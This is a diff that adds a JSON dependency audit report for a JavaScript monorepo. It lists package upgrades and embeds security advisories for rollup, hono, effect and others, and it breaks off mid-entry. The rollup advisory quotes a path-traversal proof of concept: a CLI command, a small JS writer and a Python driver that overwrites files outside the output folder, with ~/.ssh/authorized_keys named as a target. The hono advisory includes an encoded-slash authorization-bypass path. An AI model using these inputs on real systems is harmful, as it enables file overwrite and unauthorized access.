@@ -1,0 +1,1072 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115359,
+          "path": "packages__api>artillery>@aws-sdk/client-cloudwatch-logs>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@aws-sdk/client-cloudwatch-logs",
+      "target": "3.1022.0",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115538,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115539,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115544,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115588,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115589,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115692,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115693,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115694,
+          "path": "packages__adapters>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "handlebars",
+      "target": "4.7.9",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115543,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "5.0.5",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115551,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>tinyglobby>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115554,
+          "path": ".>@typescript-eslint/eslint-plugin>@typescript-eslint/type-utils>@typescript-eslint/typescript-estree>tinyglobby>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "picomatch",
+      "target": "4.0.4",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115573,
+          "path": "packages__api>express>router>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115582,
+          "path": "packages__api>express>router>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "path-to-regexp",
+      "target": "8.4.2",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "rollup",
+      "resolves": [
+        {
+          "id": 1113517,
+          "path": "packages__web>@sentry/nextjs>rollup",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@tootallnate/once",
+      "resolves": [
+        {
+          "id": 1113977,
+          "path": "packages__web>jest-environment-jsdom>jsdom>http-proxy-agent>@tootallnate/once",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@hono/node-server",
+      "resolves": [
+        {
+          "id": 1114170,
+          "path": ".>prisma>@prisma/dev>@hono/node-server",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "effect",
+      "resolves": [
+        {
+          "id": 1115356,
+          "path": ".>prisma>@prisma/config>effect",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "picomatch",
+      "resolves": [
+        {
+          "id": 1115549,
+          "path": ".>lint-staged>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115552,
+          "path": ".>lint-staged>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "yaml",
+      "resolves": [
+        {
+          "id": 1115555,
+          "path": "packages__web>@builder.io/react>@emotion/core>@emotion/css>babel-plugin-emotion>babel-plugin-macros>cosmiconfig>yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115556,
+          "path": "packages__cli>yaml",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "lodash",
+      "resolves": [
+        {
+          "id": 1115806,
+          "path": ".>prisma>@prisma/dev>@mrleebo/prisma-ast>chevrotain>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115810,
+          "path": ".>prisma>@prisma/dev>@mrleebo/prisma-ast>chevrotain>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1113517": {
+      "findings": [
+        {
+          "version": "2.79.2",
+          "paths": ["packages__web>@sentry/nextjs>rollup"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/rollup/rollup/security/advisories/GHSA-mw96-cpmx-2vgc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27606\n- https://github.com/rollup/rollup/commit/c60770d7aaf750e512c1b2774989ea4596e660b2\n- https://github.com/rollup/rollup/commit/c8cf1f9c48c516285758c1e11f08a54f304fd44e\n- https://github.com/rollup/rollup/commit/d6dee5e99bb82aac0bee1df4ab9efbde455452c3\n- https://github.com/rollup/rollup/releases/tag/v2.80.0\n- https://github.com/rollup/rollup/releases/tag/v3.30.0\n- https://github.com/rollup/rollup/releases/tag/v4.59.0\n- https://github.com/advisories/GHSA-mw96-cpmx-2vgc",
+      "created": "2026-02-25T22:37:26.000Z",
+      "id": 1113517,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nThe Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.\n\n### Details\nThe vulnerability is caused by the combination of two flawed components in the Rollup core:\n\n1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\\`). \n    ```typescript\n    // src/utils/sanitizeFileName.ts (Line 3)\n    const INVALID_CHAR_REGEX = /[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g;\n    ```\n    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.\n\n2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the \"sanitized\" filename.\n    ```typescript\n    // src/rollup/rollup.ts (Line 317)\n    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);\n    ```\n    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.\n\n### PoC\nA demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.\n\n**Scenario: CLI Named Input Exploit**\n1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).\n2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:\n    ```bash\n    rollup --input \"a/../../pwned.js=main.js\" --dir dist\n    ```\n3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.\n\n**Reproduction Files provided :**\n*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.\n*   `exploit.py`: Automated script to run the PoC and verify the file escape.\n\nvuln_app.js\n```js\nconst path = require('path');\nconst fs = require('fs');\n\n/**\n * REPLICATED ROLLUP VULNERABILITY\n * \n * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)\n * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)\n */\n\nfunction sanitize(name) {\n    // The vulnerability: Rollup's regex fails to strip dots and slashes, \n    // allowing path traversal sequences like '../'\n    return name.replace(/[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g, '_');\n}\n\nasync function build(userSuppliedName) {\n    const outputDir = path.join(__dirname, 'dist');\n    const fileName = sanitize(userSuppliedName);\n\n    // Vulnerability: path.resolve() follows traversal sequences in the filename\n    const outputPath = path.resolve(outputDir, fileName);\n\n    console.log(`[*] Target write path: ${outputPath}`);\n\n    if (!fs.existsSync(path.dirname(outputPath))) {\n        fs.mkdirSync(path.dirname(outputPath), { recursive: true });\n    }\n\n    fs.writeFileSync(outputPath, 'console.log(\"System Compromised!\");');\n    console.log(`[+] File written successfully.`);\n}\n\nbuild(process.argv[2] || 'bundle.js');\n\n```\n\nexploit.py\n```py\nimport subprocess\nfrom pathlib import Path\n\ndef run_poc():\n    # Target a file outside the 'dist' folder\n    poc_dir = Path(__file__).parent\n    malicious_filename = \"../pwned_by_rollup.js\"\n    target_path = poc_dir / \"pwned_by_rollup.js\"\n\n    print(f\"=== Rollup Path Traversal PoC ===\")\n    print(f\"[*] Malicious Filename: {malicious_filename}\")\n    \n    # Trigger the vulnerable app\n    subprocess.run([\"node\", \"poc/vuln_app.js\", malicious_filename])\n\n    if target_path.exists():\n        print(f\"[SUCCESS] File escaped 'dist' folder!\")\n        print(f\"[SUCCESS] Created: {target_path}\")\n        # target_path.unlink() # Cleanup\n    else:\n        print(\"[FAILED] Exploit did not work.\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n## POC \n```rollup --input \"bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js\" --dir dist```\n\n<img width=\"1918\" height=\"1111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4\" />\n\n\n\n### Impact\nThis is a **High** level of severity vulnerability.\n*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.\n*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.\n*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.",
+      "reported_by": null,
+      "title": "Rollup 4 has Arbitrary File Write via Path Traversal",
+      "metadata": null,
+      "cves": ["CVE-2026-27606"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "rollup",
+      "vulnerable_versions": "<2.80.0",
+      "github_advisory_id": "GHSA-mw96-cpmx-2vgc",
+      "recommendation": "Upgrade to version 2.80.0 or later",
+      "patched_versions": ">=2.80.0",
+      "updated": "2026-02-25T22:37:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": ["CWE-22"],
+      "url": "https://github.com/advisories/GHSA-mw96-cpmx-2vgc"
+    },
+    "1113977": {
+      "findings": [
+        {
+          "version": "2.0.0",
+          "paths": ["packages__web>jest-environment-jsdom>jsdom>http-proxy-agent>@tootallnate/once"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-3449\n- https://github.com/TooTallNate/once/issues/8\n- https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a\n- https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612\n- https://github.com/advisories/GHSA-vpq2-c234-7xj6",
+      "created": "2026-03-03T06:31:14.000Z",
+      "id": 1113977,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.",
+      "reported_by": null,
+      "title": "@tootallnate/once vulnerable to Incorrect Control Flow Scoping",
+      "metadata": null,
+      "cves": ["CVE-2026-3449"],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@tootallnate/once",
+      "vulnerable_versions": "<3.0.1",
+      "github_advisory_id": "GHSA-vpq2-c234-7xj6",
+      "recommendation": "Upgrade to version 3.0.1 or later",
+      "patched_versions": ">=3.0.1",
+      "updated": "2026-03-04T20:15:03.000Z",
+      "cvss": {
+        "score": 3.3,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": ["CWE-705"],
+      "url": "https://github.com/advisories/GHSA-vpq2-c234-7xj6"
+    },
+    "1114170": {
+      "findings": [
+        {
+          "version": "1.19.9",
+          "paths": [".>prisma>@prisma/dev>@hono/node-server"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-wc8c-qw6v-h7f6\n- https://github.com/honojs/node-server/commit/455015be1697dd89974a68b70350ea7b2d126d2e\n- https://nvd.nist.gov/vuln/detail/CVE-2026-29087\n- https://github.com/advisories/GHSA-wc8c-qw6v-h7f6",
+      "created": "2026-03-04T20:05:49.000Z",
+      "id": 1114170,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen using @hono/node-server's static file serving together with route-based middleware protections (e.g. protecting `/admin/*`), inconsistent URL decoding can allow protected static resources to be accessed without authorization.\n\nIn particular, paths containing encoded slashes (`%2F`) may be evaluated differently by routing/middleware matching versus static file path resolution, enabling a bypass where middleware does not run but the static file is still served.\n\n## Details\n\nThe routing layer and the node-server static handler normalize request paths differently. The router preserves `%2F` as a literal string when matching routes, while the static handler decodes `%2F` into `/` before resolving the filesystem path.\n\nExample request:\n\n- `/admin%2Fsecret.html`\n\nThis may:\n- fail to match middleware intended for `/admin/*`, but\n- still be resolved by the static handler as `/admin/secret.html` under the configured static root.\n\nThis does not allow access outside the configured static root and is not a path traversal vulnerability.\n\n## Impact\n\nAn unauthenticated attacker could bypass route-based authorization protections for protected static resources by supplying paths containing encoded slashes.\n\nApplications relying solely on route-based middleware to protect static subpaths under the same static root may have exposed those resources.",
+      "reported_by": null,
+      "title": "@hono/node-server has authorization bypass for protected static paths via encoded slashes in Serve Static Middleware",
+      "metadata": null,
+      "cves": ["CVE-2026-29087"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": "<1.19.10",
+      "github_advisory_id": "GHSA-wc8c-qw6v-h7f6",
+      "recommendation": "Upgrade to version 1.19.10 or later",
+      "patched_versions": ">=1.19.10",
+      "updated": "2026-03-06T22:43:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": ["CWE-863"],
+      "url": "https://github.com/advisories/GHSA-wc8c-qw6v-h7f6"
+    },
+    "1115356": {
+      "findings": [
+        {
+          "version": "3.18.4",
+          "paths": [".>prisma>@prisma/config>effect"]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/Effect-TS/effect/security/advisories/GHSA-38f7-945m-qr2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32887\n- https://github.com/advisories/GHSA-38f7-945m-qr2g",
+      "created": "2026-03-20T20:34:06.000Z",
+      "id": 1115356,
+      "npm_advisory_id": null,
+      "overview": "## Versions\n\n- `effect`: 3.19.15\n- `@effect/rpc`: 0.72.1\n- `@effect/platform`: 0.94.2\n- Node.js: v22.20.0\n- Vercel runtime with Fluid compute\n- Next.js: 16 (App Router)\n- `@clerk/nextjs`: 6.x\n\n## Root cause\n\nEffect's `MixedScheduler` batches fiber continuations and drains them inside a **single** microtask or timer callback. The `AsyncLocalStorage` context active during that callback belongs to whichever request first triggered the scheduler's drain cycle ΓÇö **not** the request that owns the fiber being resumed.\n\n### Detailed mechanism\n\n#### 1. Scheduler batching (`effect/src/Scheduler.ts`, `MixedScheduler`)\n\n```typescript\n// MixedScheduler.starve() ΓÇö called once when first task is scheduled\nprivate starve(depth = 0) {\n  if (depth >= this.maxNextTickBeforeTimer) {\n    setTimeout(() => this.starveInternal(0), 0)       // timer queue\n  } else {\n    Promise.resolve(void 0).then(() => this.starveInternal(depth + 1)) // microtask queue\n  }\n}\n\n// MixedScheduler.starveInternal() ΓÇö drains ALL accumulated tasks in one call\nprivate starveInternal(depth: number) {\n  const tasks = this.tasks.buckets\n  this.tasks.buckets = []\n  for (const [_, toRun] of tasks) {\n    for (let i = 0; i < toRun.length; i++) {\n      toRun[i]()  // ΓåÉ Every fiber continuation runs in the SAME ALS context\n    }\n  }\n  // ...\n}\n```\n\n`scheduleTask` only calls `starve()` when `running` is `false`. Subsequent tasks accumulate in `this.tasks` until `starveInternal` drains them all. The `Promise.then()` (or `setTimeout`) callback inherits the ALS context from whichever call site created it ΓÇö i.e., whichever request's fiber first set `running = true`.\n\n**Result:** Under concurrent load, fiber continuations from Request A and Request B execute inside the same `starveInternal` call, sharing a single ALS context. If Request A triggered `starve()`, then Request B's fiber reads Request A's ALS context.\n\n#### 2. `toWebHandlerRuntime` does not propagate ALS (`@effect/platform/src/HttpApp.ts:211-240`)\n\n```typescript\nexport const toWebHandlerRuntime = <R>(runtime: Runtime.Runtime<R>) => {\n  const httpRuntime: Types.Mutable<Runtime.Runtime<R>> = Runtime.make(runtime)\n  const run = Runtime.runFork(httpRuntime)\n  return <E>(self: Default<E, R | Scope.Scope>, middleware?) => {\n    return (request: Request, context?): Promise<Response> =>\n      new Promise((resolve) => {\n        // Per-request Effect context is correctly set via contextMap:\n        const contextMap = new Map<string, any>(runtime.context.unsafeMap)\n        const httpServerRequest = ServerRequest.fromWeb(request)\n        contextMap.set(ServerRequest.HttpServerRequest.key, httpServerRequest)\n        httpRuntime.context = Context.unsafeMake(contextMap)\n\n        // But the fiber is forked without any ALS propagation:\n        const fiber = run(httpApp as any)  // ΓåÉ ALS context is NOT captured or restored\n      })\n  }\n}\n```\n\nEffect's own `Context` (containing `HttpServerRequest`) is correctly set per-request. But the **Node.js ALS context** ΓÇö which frameworks like Next.js, Clerk, and OpenTelemetry rely on ΓÇö is not captured at fork time or restored when the fiber's continuations execute.\n\n#### 3. The dangerous pattern this enables\n\n```typescript\n// RPC handler ΓÇö runs inside an Effect fiber\nconst handler = Effect.gen(function*() {\n  // This calls auth() from @clerk/nextjs/server, which reads from ALS\n  const { userId } = yield* Effect.tryPromise({\n    try: async () => auth(),  // ΓåÉ may read WRONG user's session\n    catch: () => new UnauthorizedError({ message: \"Auth failed\" })\n  })\n  return yield* repository.getUser(userId)\n})\n```\n\nThe `async () => auth()` thunk executes when the fiber continuation is scheduled by `MixedScheduler`. At that point, the ALS context belongs to an arbitrary concurrent request.\n\n## Reproduction scenario\n\n```\nTimeline (two concurrent requests to the same toWebHandler endpoint):\n\nT0: Request A arrives ΓåÆ POST handler ΓåÆ webHandler(requestA)\n    ΓåÆ Promise executor runs synchronously\n    ΓåÆ httpRuntime.context set to A's context\n    ΓåÆ fiber A forked, runs first ops synchronously\n    ΓåÆ fiber A yields (e.g., at Effect.tryPromise boundary)\n    ΓåÆ scheduler.scheduleTask(fiberA_continuation)\n    ΓåÆ running=false ΓåÆ starve() called ΓåÆ Promise.resolve().then(drain)\n       Γåæ ALS context captured = Request A's context\n\nT1: Request B arrives ΓåÆ POST handler ΓåÆ webHandler(requestB)\n    ΓåÆ Promise executor runs synchronously\n    ΓåÆ httpRuntime.context set to B's context\n    ΓåÆ fiber B forked, runs first ops synchronously\n    ΓåÆ fiber B yields\n    ΓåÆ scheduler.scheduleTask(fiberB_continuation)\n    ΓåÆ running=true ΓåÆ task queued, no new starve()\n\nT2: Microtask fires ΓåÆ starveInternal() runs\n    ΓåÆ Drains fiberA_continuation ΓåÆ auth() reads ALS ΓåÆ gets A's context Γ£ô\n    ΓåÆ Drains fiberB_continuation ΓåÆ auth() reads ALS ΓåÆ gets A's context Γ£ù ΓåÉ WRONG USER\n```\n\n## Minimal reproduction\n\n```typescript\nimport { AsyncLocalStorage } from \"node:async_hooks\"\nimport { Effect, Layer } from \"effect\"\nimport { RpcServer, RpcSerialization, Rpc, RpcGroup } from \"@effect/rpc\"\nimport { HttpServer } from \"@effect/platform\"\nimport * as S from \"effect/Schema\"\n\n// Simulate a framework's ALS (like Next.js / Clerk)\nconst requestStore = new AsyncLocalStorage<{ userId: string }>()\n\nclass GetUser extends Rpc.make(\"GetUser\", {\n  success: S.Struct({ userId: S.String, alsUserId: S.String }),\n  failure: S.Never,\n  payload: {}\n}) {}\n\nconst MyRpc = RpcGroup.make(\"MyRpc\").add(GetUser)\n\nconst MyRpcLive = MyRpc.toLayer(\n  RpcGroup.toHandlers(MyRpc, {\n    GetUser: () =>\n      Effect.gen(function*() {\n        // Simulate calling an ALS-dependent API inside an Effect fiber\n        const alsResult = yield* Effect.tryPromise({\n          try: async () => {\n            const store = requestStore.getStore()\n            return store?.userId ?? \"NONE\"\n          },\n          catch: () => { throw new Error(\"impossible\") }\n        })\n        return { userId: \"from-effect-context\", alsUserId: alsResult }\n      })\n  })\n)\n\nconst RpcLayer = MyRpcLive.pipe(\n  Layer.provideMerge(RpcSerialization.layerJson),\n  Layer.provideMerge(HttpServer.layerContext)\n)\n\nconst { handler } = RpcServer.toWebHandler(MyRpc, { layer: RpcLayer })\n\n// Simulate two concurrent requests with different ALS contexts\nasync function main() {\n  const results = await Promise.all([\n    requestStore.run({ userId: \"user-A\" }, () => handler(makeRpcRequest(\"GetUser\"))),\n    requestStore.run({ userId: \"user-B\" }, () => handler(makeRpcRequest(\"GetUser\"))),\n  ])\n\n  // Parse responses and check if alsUserId matches the expected user\n  // Under the bug: both responses may show \"user-A\" (or one shows the other's)\n  for (const res of results) {\n    console.log(await res.json())\n  }\n}\n```\n\n## Impact\n\n| Symptom | Severity |\n|---------|----------|\n| `auth()` returns wrong user's session | **Critical** ΓÇö authentication bypass |\n| `cookies()` / `headers()` from Next.js read wrong request | **High** ΓÇö data leakage |\n| OpenTelemetry trace context crosses requests | **Medium** ΓÇö incorrect traces |\n| Works locally, fails in production | Hard to diagnose ΓÇö only manifests under concurrent load |\n\n## Workaround\n\nCapture ALS-dependent values **before** entering the Effect runtime and pass them via Effect's own context system:\n\n```typescript\n// In the route handler ΓÇö OUTSIDE the Effect fiber (ALS is correct here)\nexport const POST = async (request: Request) => {\n  const { userId } = await auth()  // ΓåÉ Safe: still in Next.js ALS context\n\n  // Inject into request headers or use the `context` parameter\n  const headers = new Headers(request.headers)\n  headers.set(\"x-clerk-auth-user-id\", userId ?? \"\")\n  const enrichedRequest = new Request(request.url, {\n    method: request.method,\n    headers,\n    body: request.body,\n    duplex: \"half\" as any,\n  })\n\n  return webHandler(enrichedRequest)\n}\n\n// In Effect handlers ΓÇö read from HttpServerRequest headers instead of calling auth()\nconst getAuthenticatedUserId = Effect.gen(function*() {\n  const req = yield* HttpServerRequest.HttpServerRequest\n  const userId = req.headers[\"x-clerk-auth-user-id\"]\n  if (!userId) return yield* Effect.fail(new UnauthorizedError({ message: \"Auth required\" }))\n  return userId\n})\n```\n\n## Suggested fix (for Effect maintainers)\n\n### Option A: Propagate ALS context through the scheduler\n\nCapture the `AsyncLocalStorage` snapshot when a fiber continuation is scheduled, and restore it when the continuation executes:\n\n```typescript\n// In MixedScheduler or the fiber runtime\nimport { AsyncLocalStorage } from \"node:async_hooks\"\n\nscheduleTask(task: Task, priority: number) {\n  // Capture current ALS context\n  const snapshot = AsyncLocalStorage.snapshot()\n  this.tasks.scheduleTask(() => snapshot(task), priority)\n  // ...\n}\n```\n\n`AsyncLocalStorage.snapshot()` (Node.js 20.5+) returns a function that, when called, restores the ALS context from the point of capture. This ensures each fiber continuation runs with its originating request's ALS context.\n\n**Trade-off:** Adds one closure allocation per scheduled task. Could be opt-in via a `FiberRef` or scheduler option.\n\n### Option B: Capture ALS at `runFork` and restore per fiber step\n\nWhen `Runtime.runFork` is called, capture the ALS snapshot and associate it with the fiber. Before each fiber step (in the fiber runtime's `evaluateEffect` loop), restore the snapshot.\n\n**Trade-off:** More invasive but provides correct ALS propagation for the fiber's entire lifetime, including across `flatMap` chains and `Effect.tryPromise` thunks.\n\n### Option C: Document the limitation and provide a `context` injection API\n\nIf ALS propagation is intentionally not supported, document this prominently and provide a first-class API for `toWebHandler` to accept per-request context. The existing `context?: Context.Context<never>` parameter on the handler function partially addresses this, but it requires callers to know about the issue and manually extract values before entering Effect.\n\n## Related\n\n- Node.js `AsyncLocalStorage` docs: https://nodejs.org/api/async_context.html\n- `AsyncLocalStorage.snapshot()`: https://nodejs.org/api/async_context.html#static-method-asynclocalstoragesnapshot\n- Next.js uses ALS for `cookies()`, `headers()`, `auth()` in App Router\n- Similar issue pattern in other fiber-based runtimes (e.g., ZIO has `FiberRef` propagation for this)\n\n\n## POC replica of my setup\n\n```\n// Create web handler from Effect RPC\n// sharedMemoMap ensures all RPC routes share the same connection pool\nconst { handler: webHandler, dispose } = RpcServer.toWebHandler(DemoRpc, {\n  layer: RpcLayer,\n  memoMap: sharedMemoMap,\n});\n\n/**\n * POST /api/rpc/demo\n */\nexport const POST = async (request: Request) => {\n  return webHandler(request);\n};\n\nregisterDispose(dispose);\n```\n\n### Used util functions\n\n```\n\n/**\n * Creates a dispose registry that collects dispose callbacks and runs them\n * when `runAll` is invoked. Handles both sync and async dispose functions,\n * catching errors to prevent one failing dispose from breaking others.\n *\n * @internal Exported for testing ΓÇö use `registerDispose` in application code.\n */\nexport const makeDisposeRegistry = () => {\n  const disposeFns: Array<() => void | Promise<void>> = []\n\n  const runAll = () => {\n    for (const fn of disposeFns) {\n      try {\n        const result = fn()\n        if (result && typeof result.then === \"function\") {\n          result.then(undefined, (err: unknown) => console.error(\"Dispose error:\", err))\n        }\n      } catch (err) {\n        console.error(\"Dispose error:\", err)\n      }\n    }\n  }\n\n  const register = (dispose: () => void | Promise<void>) => {\n    disposeFns.push(dispose)\n  }\n\n  return { register, runAll }\n}\n\nexport const registerDispose: (dispose: () => void | Promise<void>) => void = globalValue(\n  Symbol.for(\"@global/RegisterDispose\"),\n  () => {\n    const registry = makeDisposeRegistry()\n\n    if (typeof process !== \"undefined\") {\n      process.once(\"beforeExit\", registry.runAll)\n    }\n\n    return registry.register\n  }\n)\n```\n\n### The actual effect that was run within the RPC context that the bug was found\n\n```\nexport const getAuthenticatedUserId: Effect.Effect<string, UnauthorizedError> =\n  Effect.gen(function*() {\n    const authResult = yield* Effect.tryPromise({\n      try: async () => auth(),\n      catch: () =>\n        new UnauthorizedError({\n          message: \"Failed to get auth session\"\n        })\n    })\n\n    if (!authResult.userId) {\n      return yield* Effect.fail(\n        new UnauthorizedError({\n          message: \"Authentication required\"\n        })\n      )\n    }\n\n    return authResult.userId\n  })\n ```",
+      "reported_by": null,
+      "title": "Effect `AsyncLocalStorage` context lost/contaminated inside Effect fibers under concurrent load with RPC",
+      "metadata": null,
+      "cves": ["CVE-2026-32887"],
+      "access": "public",
+      "severity": "high",
+      "module_name": "effect",
+      "vulnerable_versions": "<3.20.0",
+      "github_advisory_id": "GHSA-38f7-945m-qr2g",
+      "recommendation": "Upgrade to version 3.20.0 or later",
+      "patched_versions": ">=3.20.0",
+      "updated": "2026-03-25T18:11:19.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": ["CWE-362"],
+      "url": "https://github.com/advisories/GHSA-38f7-945m-qr2g"
+    },
+    "1115359": {
+      "findings": [
+        {
+          "version": "5.5.6",
+          "paths": [
+            "packages__api>artillery>@aws-sdk/client-cloudwatch-logs>@aws-sdk/core>@aws-sdk/xml-builder>fast-xml-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jp2q-39xq-3w4g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33349\n- https://github.com/NaturalIntelligence/fast-xml-parser/commit/239b64aa1fc5c5455ddebbbb54a187eb68c9fdb7\n- https://github.com/advisories/GHSA-jp2q-39xq-3w4g",
+      "created": "2026-03-19T19:13:13.000Z",
+      "id": 1115359,
+      "npm_advisory_id": null,
